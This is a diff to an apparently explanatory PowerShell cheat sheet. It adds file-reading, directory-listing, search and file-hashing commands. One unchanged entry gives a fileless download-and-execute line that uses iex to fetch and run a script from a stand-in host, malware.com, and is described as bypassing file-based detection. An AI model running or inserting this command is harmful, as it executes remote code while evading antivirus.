@@ -60,6 +60,22 @@
 ## Read File
 `Get-Content file.txt | ForEach-Object { }`
 
+`Get-Content -Path {Path to the text file}`
+
+`Get-ChildItem -Path {Path of the Directory}`
+
+`(Get-Item {Path to the file}).CreationTime`
+
+`Select-String -Path {Path} -Pattern "{Pattern}"`
+
+```
+$files = Get-ChildItem -Path {Path of the Directory} -Recurse -File
+$report = foreach ($file in $files) {
+  Get-FileHash -Path $file.FullName
+}
+$report | Out-File -FilePath {Path\To\Report.txt}
+```
+
 ---
 
 ## Restart Service
@@ -76,3 +92,8 @@
 
 ## Bypasses file-based detection and executes malicious code directly in memory
 `iex((New-Object Net.WebClient).DownloadString('https://malware.com/payload.ps1'))`
+
+---
+
+## Hash
+`Get-FileHash -Algorithm MD5 -Path {Path to the file}`
